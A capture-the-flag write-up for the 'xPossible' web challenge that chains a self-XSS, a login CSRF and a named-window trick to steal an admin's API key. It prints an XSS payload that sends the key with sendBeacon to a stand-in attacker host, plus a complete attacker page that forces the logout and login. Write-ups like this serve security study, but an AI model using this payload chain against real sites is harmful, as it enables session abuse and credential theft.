# Exploit `xPossible` challenge 
> [!NOTE]
> AFTER SEC PATCH!!!!! [461d5d03678b2466f0a71ad44d87f0aa1b9ed9ab](https://github.com/VoorivexTeam/white-box-challenges/commit/461d5d03678b2466f0a71ad44d87f0aa1b9ed9ab)

## Source
- [challenge source](https://github.com/VoorivexTeam/white-box-challenges/tree/main/xPossible)

## WriteUp
- login to your account
- put this payload in `name` to perform a `self XSS`
```html
<script>w_with_data = window.open('', 'jahfar'); key = w_with_data.document.querySelector('.api-key p').textContent; navigator.sendBeacon("http://atacker.com", key);</script>
```
the payload will open a window called `jahfar`, read the `w_with_data.document.querySelector('.api-key p').textContent` and send it to `http://atacker.com`
- then make a page with this source and give it to `admin` user
> [!NOTE]
> after this security patch [461d5d03678b2466f0a71ad44d87f0aa1b9ed9ab](https://github.com/VoorivexTeam/white-box-challenges/commit/461d5d03678b2466f0a71ad44d87f0aa1b9ed9ab)
> first we need to create an admin session and then logout the admin to be able to logged into attacker's account
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Redirector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
        }

        .login-form {
            display: none; 
        }

    </style>
</head>
<body>
    <img src="http://dargazbazar.ir//Opitures/111057717951644.jpg" onclick="run()" width="500px" height="500px">

    <img src="https://api.omdebashi.com/static/images/products/cover/golmohammadi-denmarki-moeinipour-3674133-optimized.jpeg" alt="Placeholder Image" onclick="logout()">

    <div class="login-form">
        <form id="loginForm" action="http://victim.com" method="POST">
            <input type="text" name="username" placeholder="Username" value="user" required>
            <input type="password" name="password" placeholder="Password" value="pass" required>
            <input type="hidden" name="login" value="1">
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        function logout() {
            var a = window.open("http://victim.com?logout=1", "temp", "width=600,height=400"); //logout the admin session
            if (a) {
                setTimeout(() => {
                    if (!a.closed) a.close();
                    document.getElementById("loginForm").submit(); // log into our user with self XSS
                }, 10);
            }
        }

        function run() {
            window.w_with_data = window.open("http://victim.com", "jahfar", "width=100,height=100"); //open the page in admin session
        }
    </script>
</body>
</html>
```
this source will open a window to `http://victim.com` name it `jahfar`, in there, `admin` has a session in there so the API key is admin's API key.<br>
> [!WARNING]
> cause of `Popup Blocking Policies` in browsers, we need two seperate user gestures to open multiple windows, in here I used two images with `onclick`, we can use `onclick` and `dbclick` or other combination.

- then the form is submited, and the `admin` will be logged in to your account and make the xss run
- the xss will get the content of the `jahfar` window, because the `jahfar` window is the same origin with `self XSS` page, we can get the content, `SOP` will not prevent us, and because the session on `jahfar` window is still the admin's session, we can read the admin's API key  


